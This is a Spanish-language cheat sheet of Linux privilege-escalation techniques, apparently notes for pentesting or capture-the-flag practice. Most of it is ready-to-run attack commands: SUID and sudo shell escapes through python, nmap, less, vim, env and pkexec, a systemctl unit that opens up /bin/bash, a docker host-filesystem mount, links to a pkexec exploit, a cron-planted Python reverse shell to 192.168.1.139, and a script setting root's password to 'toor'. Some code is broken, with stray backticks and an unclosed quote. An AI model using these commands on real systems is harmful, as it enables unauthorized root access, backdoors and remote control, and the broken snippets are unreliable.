### Primeras comprobaciones
#### Grupos de usuario
Ver si esta el usuario en algun grupo interesante, como el de docker

```bash
id
```
#### Ejecución de tareas como root
```bash
sudo -l
```
#### Permisos SUID y GUID
```bash
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null
```
#### Versión de sudo
con este comando podremos ver la versión de sudo, y se puede buscar alguna vulnerabilidad afectada a la versión.

```bash
sudo -V
```
#### Version del S.O
```bash
lsb_release -a
```
#### Version de kernel
```bash
uname -r
```

#### Listar tareas cron
```bash
	cat /etc/crontab
```

#### Comprobar grupos
A veces nuestro usuario no tiene privilegios, pero si el grupo al que pertenece
```bash
id
find / -group "grupo" 2>/dev/null
```

#### Buscar capturas de wireshark
```bash
find / -name *.pcap* 2>/dev/null
```

#### Mirar las variables de entorno
En ocasiones podemos encontrar credenciales, o aprovechar para ver si hay algo raro en el path
```bash
env
```

#### Comprobar el historial
```bash
history

cat $HOME/.bash_history
```
### Capabilities
```bash
getcap -r / 2>/dev/null
```

#### Capability Setuid en python
si encontramos que python3 tiene la capability de setuid. con esta capability podemos ejecutar una shell cambiando la uid del usuario actual por "0" que es la de root.

```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh)'
```

### Permisos SUID y GUID
```bash
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null
```

#### Permiso de SUID en nmap
basta con lanzar nmap de forma interactiva
```bash
nmap --interactive
```

y luego lanzar
```bash
!bash -p
```
#### Permiso de SUID pkexec
se puede utilizar el siguiente exploit, cuando pkexec tiene permisos SUID
[pkexec](https://github.com/Almorabea/pkexec-exploit/blob/main/CVE-2021-4034.py)

al compartirlo con la máquina y darle permisos de ejecución, nos preguntará si queremos usar el payload por defecto, escribimos **n** y aceptamos.

#### Permiso de SUID Python
```bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### Permiso de SUID polkit
Cuando detectamos algun binario con nombre similar a **polkit** , se puede explotar con un exploit.

https://github.com/Almorabea/Polkit-exploit

#### Permiso de SUID env
```bash
/usr/bin/env /bin/sh -p
```

#### Permiso SUID Less
Leemos un fichero:
```bash
sudo /bin/less fichero.txt

Luego nos aparece resaltado el (END)
ahí escribimos una exclamación !
y podemos ejecutar comandos del sistema desde less, pero como tenemos permiso SUID podemos ejecutar:
/bin/bash

y ya somos root
```

#### Permiso SUID Systemctl
al ejecutar este script, estamos dando permiso SUID a "/bin/bash".
```bash
#!/bin/bash 
TF=$(mktemp).service 
echo '[Service] 
Type=oneshot 
ExecStart=/bin/sh -c "chmod 777 /bin/bash" 
[Install] 
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Luego ejecutamos una bash y seremos root.
```bash
bash -p
```
### SUDO -L
Si encontramos un binario que con ==sudo -l== vemos que podemos ejecutarlo como si fueramos el administrador, podemos buscar en **GTFOBins**

#### Sudo -L VIM

Si encontramos vim con sudo -l. Abrimos vim
``` bash
sudo vim -c ':!/bin/sh'
```

Alternativa:
```bash
sudo /usr/bin/vim

Una vez abierto:
:set shell=/bin/bash

pulsamos INTRO y luego escribimos
:shell

pulsamos INTRO y ya somos root
```

#### Sudo -L Pkexec
con este binario con permisos SUID se ejecuta un CVE, pero cuando tenemos permisos para ejecutar como el propietario, se puede hacer:
```bash
sudo pkexec /bin/sh
```
### Docker
Pudiendo ejecutar docker sin ser root, se puede escalar privilegios y montar el sistema de ficheros de la maquina real en el contenedor de forma que podremos acceder a todo.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

>NOTA
>Seremos root en el contenedor, no en la máquina. Pero podremos acceder a todo el sistema de ficheros.

### Binario con permisos de edición y ejecución

Con sudo -l vemos que se puede ejecutar como root, sus permisos nos deja editar el fichero, algo así ==rwxrwxrwx==. editamos dicho binario y le metemos el comando ==su -==.

### Tareas cron
Si detectamos un binario que se ejecuta a intervalos regulares, con privilegios de root y lo podemos editar para escalar privilegios o darnos una reverse shell como root.

#### Crontab
El fichero **/etc/cron.d** establece las tareas que se ejecutan y se configuran a intervalos regulares. Si lo podemos editar, podemos hacer ejecutar un script para escalar privilegios.


##### Tarea cron python (reverse shell)
Si es editable añadimos el siguiente codigo para establecer una reverse shell con tareas cron. (y nos ponemos a la escucha):
```python 
`#!/bin/python3`

`import sys`

`import time`

`import subprocess`

`from pwn import *`

`if` `__name__ ==` `"__main__"``:`

    `s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((``"192.168.1.139"``,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([``"/bin/sh"``,``"-i"``])`
```

##### Tarea cron bash (cambio contraseña root)
Este script, establece al usuario root, la **contraseña: "toor"**

```bash
#!/bin/bash  
echo -e "toor\ntoor" | passwd root
```
### Herramientas automatizadas escalada privilegios

#### LES (Linux exploit suggester)
[Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
Herramienta que busca vulnerabilidades a nivel de kernel de linux

#### linPEAS
[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
Herramienta que busca posibles malas configuraciones en la maquina para intentar escalar privilegios

### Pspy
[Pspy](https://github.com/DominicBreuker/pspy)
Herramienta para monitorizar tareas cron

### Escalada privilegios con path hijacking
<a href="https://glmbxecurity.github.io/docs/5-hacking-linux/path-hijacking/">




